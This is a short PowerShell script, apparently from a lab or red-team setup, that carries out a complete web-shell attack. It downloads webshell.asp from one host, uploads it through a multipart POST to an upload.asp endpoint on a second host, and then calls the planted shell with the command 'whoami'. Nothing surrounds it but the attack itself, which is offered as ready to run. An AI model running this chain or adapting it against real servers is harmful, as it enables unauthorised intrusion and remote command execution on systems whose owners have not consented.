Invoke-WebRequest 'http://192.168.56.1:34444/agents/webshell.asp' -OutFile "$env:TEMP\w.asp" -UseBasicParsing
$b=[guid]::NewGuid()
$c=[IO.File]::ReadAllText("$env:TEMP\w.asp")
$body="--$b`r`nContent-Disposition: form-data; name=`"file`"; filename=`"webshell.asp`"`r`n`r`n$c`r`n--$b--"
Invoke-WebRequest "http://192.168.56.210/upload.asp" -Method Post -ContentType "multipart/form-data; boundary=$b" -Body $body -UseBasicParsing
Invoke-WebRequest 'http://192.168.56.210/uploads/webshell.asp?c=whoami' -UseBasicParsing